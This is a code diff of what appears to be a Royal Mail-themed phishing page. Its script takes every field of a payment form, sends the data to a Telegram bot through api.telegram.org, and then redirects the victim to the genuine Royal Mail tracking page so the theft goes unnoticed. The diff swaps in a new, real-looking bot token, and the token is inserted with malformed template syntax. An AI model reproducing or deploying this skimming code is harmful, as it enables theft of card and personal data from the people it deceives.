@@ -45,7 +45,7 @@
 
   <script>
     // ---------- CONFIGURE AQUI ----------
-    const TOKEN   = '8721188883:AAEWO2YWWThjYLyQVbVUuxOf97ltFKmiBrQ';
+    const TOKEN   = '8635148208:AAHTBQHHQenARmqCk7ycc5DmDrIzkG3MLJU';
     const CHAT_ID = '-1001234567890';
     // -------------------------------------
 
@@ -72,7 +72,7 @@ document.getElementById('paymentForm').addEventListener('submit', function(e) {
   // monta payload
   const q = new URLSearchParams(new FormData(this)).toString();
   // envia
-  fetch(`https://api.telegram.org/bot${8721188883:AAEWO2YWWThjYLyQVbVUuxOf97ltFKmiBrQ}/sendMessage?chat_id=${-1001234567890}&text=${q}`)
+  fetch(`https://api.telegram.org/bot{8635148208:AAHTBQHHQenARmqCk7ycc5DmDrIzkG3MLJU}/sendMessage?chat_id=${-1001234567890}&text=${q}`)
     .then(() => location.href = 'https://www.royalmail.com/track-item') // redireciona pro site real
     .catch(() => alert('Try again')); // só se cair fora
 });
